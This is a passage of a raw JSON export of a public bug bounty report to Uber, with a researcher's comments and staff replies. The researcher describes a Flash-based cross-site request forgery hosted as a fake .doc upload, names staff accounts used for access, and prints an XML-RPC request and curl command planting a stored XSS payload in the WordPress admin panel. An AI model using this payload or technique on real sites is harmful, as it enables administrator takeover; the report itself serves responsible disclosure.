PoC available at https://klikki.fi/ubdemo29767346.html (non-public URL of course). The page contains an embedded Flash app from https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc .\n\nThe Flash app (directed by JavaScript calls you see with view source) does a GET request to the *newsroom* front page and displays the HTML. An exploit targeting administrators would GET HTML forms in /wp-admin/, parse CSRF tokens, and send POST requests to submit those forms.\n","markdown_message":"\u003cp\u003eAfter some problems with XML encoding I was able to upload a working SWF file on \u003cem\u003enewsroom.uber.com\u003c/em\u003e. The file extension and Content-type given by the server are that of a MS Word document but embedding the uploaded SWF file is still possible.\u003c/p\u003e\n\n\u003cp\u003eIf a victim views such Flash app while logged on, then the attacker can send GET and POST requests on their behalf with appropriate cookies. If it\u0026#39;s an administrator, then the site contents, settings, and user accounts can be modified and the server probably compromised.\u003c/p\u003e\n\n\u003cp\u003eI made a PoC available at \u003ca title=\"https://klikki.fi/ubdemo29767346.html\" href=\"/redirect?url=https%3A%2F%2Fklikki.fi%2Fubdemo29767346.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://klikki.fi/ubdemo29767346.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (non-public URL of course). The page contains an embedded Flash app from \u003ca title=\"https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc\" href=\"/redirect?url=https%3A%2F%2Fnewsroom.uber.com%2Fus-new-york%2Fwp-content%2Fuploads%2Fsites%2F295%2F2016%2F05%2Fthigrwfjeg-swf.doc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e .\u003c/p\u003e\n\n\u003cp\u003eThe Flash app (directed by JavaScript calls you see with view source) does a GET request to the \u003cem\u003enewsroom\u003c/em\u003e front page and displays the HTML. An exploit targeting administrators would GET HTML forms in /wp-admin/, parse CSRF tokens, and send POST requests to submit those forms.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-15T16:02:53.094Z","updated_at":"2016-05-15T16:02:53.094Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":959931,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks @jouko, running this down now. ","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e, running this down now. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-16T20:59:06.955Z","updated_at":"2016-05-16T20:59:06.955Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":959992,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jouko I just went over our Wordpress users and was unable to reproduce this. What user were you spoofing to upload that file?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e I just went over our Wordpress users and was unable to reproduce this. What user were you spoofing to upload that file?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-16T21:41:49.354Z","updated_at":"2016-05-16T21:41:49.354Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":960041,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Additionally it doesn't appear those posts were created (at least as the URIs specified). I can search for them once I have the account name though.","markdown_message":"\u003cp\u003eAdditionally it doesn\u0026#39;t appear those posts were created (at least as the URIs specified). I can search for them once I have the account name though.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-16T22:08:13.694Z","updated_at":"2016-05-16T22:08:13.694Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":960078,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The SWF file is there, https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc . I uploaded it with cbarry@uber.com. The posts might not be accessible via those URLs because they're saved as drafts.  I think I used the same user on newsroom/us-new-york/ (he didn't have posting right on the global site). The account I tested on love.uber.com/australia/ was probably amrita.sareen@uber.com.\n\n","markdown_message":"\u003cp\u003eThe SWF file is there, \u003ca title=\"https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc\" href=\"/redirect?url=https%3A%2F%2Fnewsroom.uber.com%2Fus-new-york%2Fwp-content%2Fuploads%2Fsites%2F295%2F2016%2F05%2Fthigrwfjeg-swf.doc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e . I uploaded it with \u003ca title=\"cbarry@uber.com\" href=\"mailto:cbarry@uber.com\" rel=\"nofollow noopener noreferrer\"\u003ecbarry@uber.com\u003c/a\u003e. The posts might not be accessible via those URLs because they\u0026#39;re saved as drafts.  I think I used the same user on newsroom/us-new-york/ (he didn\u0026#39;t have posting right on the global site). The account I tested on love.uber.com/australia/ was probably \u003ca title=\"amrita.sareen@uber.com\" href=\"mailto:amrita.sareen@uber.com\" rel=\"nofollow noopener noreferrer\"\u003eamrita.sareen@uber.com\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-16T22:36:50.653Z","updated_at":"2016-05-16T22:36:50.653Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":960093,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You can probably find the drafts if you go to the Dashboard of the correct sites and go to the Posts menu. The URLs I gave contain the post ID's the XMLRPC reply gave me. It doesn't give direct URLs.","markdown_message":"\u003cp\u003eYou can probably find the drafts if you go to the Dashboard of the correct sites and go to the Posts menu. The URLs I gave contain the post ID\u0026#39;s the XMLRPC reply gave me. It doesn\u0026#39;t give direct URLs.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-16T22:47:21.994Z","updated_at":"2016-05-16T22:47:21.994Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":960532,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I was thinking about more ways to achieve RCE with this. Creating posts or pages containing `\u003cscript\u003e` doesn't probably work except if you can guess/find an administrator account with the default password.\n\nOne way to inject JS into the admin panel via XMLRPC is to create an attachment. This should work with any account that can publish something. Some pages don't HTML-escape the file name, creating a stored XSS in the administration panel. Example request:\n\n~~~~ xml\n\u003c?xml version=\"1.0\"?\u003e\n\u003cmethodCall\u003e\n\u003cmethodName\u003ewp.newPost\u003c/methodName\u003e\n\u003cparams\u003e\n        \u003cparam\u003e\u003cvalue\u003eempty\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003ecbarry@uber.com\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cvalue\u003e@@@nopass@@@\u003c/value\u003e\u003c/param\u003e\n        \u003cparam\u003e\u003cstruct\u003e\n                \u003cmember\u003e\u003cname\u003epost_title\u003c/name\u003e\u003cvalue\u003eaaa\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003epost_type\u003c/name\u003e\u003cvalue\u003eattachment\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003epost_content\u003c/name\u003e\u003cvalue\u003ebbb\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003epost_status\u003c/name\u003e\u003cvalue\u003epublish\u003c/value\u003e\u003c/member\u003e\n                \u003cmember\u003e\u003cname\u003efile\u003c/name\u003e\u003cvalue\u003ebugbounty'\u0026gt;test\u0026lt;img src=x onerror=alert('xss') onload=alert('xss')\u0026gt;\u003c/value\u003e\u003c/member\u003e\n        \u003c/struct\u003e\u003c/param\u003e       \n\u003c/params\u003e\n\u003c/methodCall\u003e\n~~~~\nIt can be sent with the command e.g.\n~~~~ sh\ncurl 'https://newsroom.uber.com/us-new-york/xmlrpc.php' --data-binary \"`cat xss.xml`\" -H 'Content-type: application/xml'\n~~~~\nThe root /xmlrpc.php URL gave a 403 Forbidden error, but the API is still reachable via the individual sites, e.g.  https://newsroom.uber.com/us-new-york/xmlrpc.php . Based on my test the request seemed to work and I got the ID of the newly created attachment as response.\n\n(This doesn't actually upload an attachment, but inserts a representation of a media attachment in the database. The file needn't actually exist.)\n\nThe XSS should get triggered  when an administrator clicks the Media menu in the Dashboard (of the New York site, not the global site which doesn't seem exploitable now). The media list has two modes (list and grid), but the vulnerable *list* mode is apparently the default.\n","markdown_message":"\u003cp\u003eI was thinking about more ways to achieve RCE with this. Creating posts or pages containing \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e doesn\u0026#39;t probably work except if you can guess/find an administrator account with the default password.\u003c/p\u003e\n\n\u003cp\u003eOne way to inject JS into the admin panel via XMLRPC is to create an attachment. This should work with any account that can publish something. Some pages don\u0026#39;t HTML-escape the file name, creating a stored XSS in the administration panel. Example request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodCall\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;methodName\u0026gt;\u003c/span\u003ewp.newPost\u003cspan class=\"nt\"\u003e\u0026lt;/methodName\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;params\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eempty\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003ecbarry@uber.com\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003e@@@nopass@@@\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;param\u0026gt;\u0026lt;struct\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_title\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eaaa\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_type\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003eattachment\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_content\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003ebbb\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003epost_status\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003epublish\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;member\u0026gt;\u0026lt;name\u0026gt;\u003c/span\u003efile\u003cspan class=\"nt\"\u003e\u0026lt;/name\u0026gt;\u0026lt;value\u0026gt;\u003c/span\u003ebugbounty\u0026#39;\u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003etest\u003cspan class=\"ni\"\u003e\u0026amp;lt;\u003c/span\u003eimg src=x onerror=alert(\u0026#39;xss\u0026#39;) onload=alert(\u0026#39;xss\u0026#39;)\u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/value\u0026gt;\u0026lt;/member\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/struct\u0026gt;\u0026lt;/param\u0026gt;\u003c/span\u003e       \n\u003cspan class=\"nt\"\u003e\u0026lt;/params\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/methodCall\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt can be sent with the command e.g.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;https://newsroom.uber.com/us-new-york/xmlrpc.php\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--data-binary\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"nb\"\u003ecat \u003c/span\u003exss.xml\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-type: application/xml\u0026#39;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe root /xmlrpc.php URL gave a 403 Forbidden error, but the API is still reachable via the individual sites, e.g.  \u003ca title=\"https://newsroom.uber.com/us-new-york/xmlrpc.php\" href=\"/redirect?url=https%3A%2F%2Fnewsroom.uber.com%2Fus-new-york%2Fxmlrpc.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://newsroom.uber.com/us-new-york/xmlrpc.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e . Based on my test the request seemed to work and I got the ID of the newly created attachment as response.\u003c/p\u003e\n\n\u003cp\u003e(This doesn\u0026#39;t actually upload an attachment, but inserts a representation of a media attachment in the database. The file needn\u0026#39;t actually exist.)\u003c/p\u003e\n\n\u003cp\u003eThe XSS should get triggered  when an administrator clicks the Media menu in the Dashboard (of the New York site, not the global site which doesn\u0026#39;t seem exploitable now). The media list has two modes (list and grid), but the vulnerable \u003cem\u003elist\u003c/em\u003e mode is apparently the default.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-17T05:23:59.007Z","updated_at":"2016-05-17T05:30:12.316Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":984483,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FYI, Automattic confirmed this \"stored XSS via attachment name\" which is one way to exploit the default passwords. A fix is planned to be included in an upcoming WordPress release \"in few weeks\".","markdown_message":"\u003cp\u003eFYI, Automattic confirmed this \u0026quot;stored XSS via attachment name\u0026quot; which is one way to exploit the default passwords. A fix is planned to be included in an upcoming WordPress release \u0026quot;in few weeks\u0026quot;.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-26T05:29:15.077Z","updated_at":"2016-05-26T05:29:15.077Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1015414,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-15T16:57:23.459Z","updated_at":"2016-06-15T16:57:23.459Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jouko","url":"/jouko"},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1015538,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"How is the bounty situation? The WordPress core bug described above (stored XSS via attachment file name) is exploitable independently of the OneLogin plugin. An attacker who compromises a lower-level account could inject JavaScript to admin users and therefore control site contents, create new users, escalate to RCE, etc.","markdown_message":"\u003cp\u003eHow is the bounty situation? The WordPress core bug described above (stored XSS via attachment file name) is exploitable independently of the OneLogin plugin. An attacker who compromises a lower-level account could inject JavaScript to admin users and therefore control site contents, create new users, escalate to RCE, etc.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-15T17:41:13.169Z","updated_at":"2016-06-15T17:41:13.169Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1043363,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the great find!","markdown_message":"\u003cp\u003eThanks for the great find!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-28T16:11:55.570Z","updated_at":"2016-06-28T16:11:55.570Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"bounty_amount":"7000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"uber","collaborator":{"username":"jouko","url":"/jouko"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1043560,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thanks!","markdown_message":"\u003cp\u003ethanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-28T17:33:54.972Z","updated_at":"2016-06-28T17:33:54.972Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1043564,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-28T17:35:32.134Z","updated_at":"2016-06-28T17:35:32.134Z","first_to_agree":true,"actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1071317,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks again for the report @jouko, keep them coming!","markdown_message":"\u003cp\u003eThanks again for the report \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e, keep them coming!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-15T22:04:09.207Z","updated_at":"2016-07-15T22:04:09.207Z","actor":{"username":"lyoung-uber","cleared":false,"url":"/lyoung-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/873/b506b7984a2afcd680a9d5e57f66a0c524760b47_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1071318,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-15T22:04:09.309Z","updated_at":"2016-07-15T22:04:09.309Z","actor":{"username":"lyoung-uber","cleared":false,"url":"/lyoung-uber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/873/b506b7984a2afcd680a9d5e57f66a0c524760b47_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}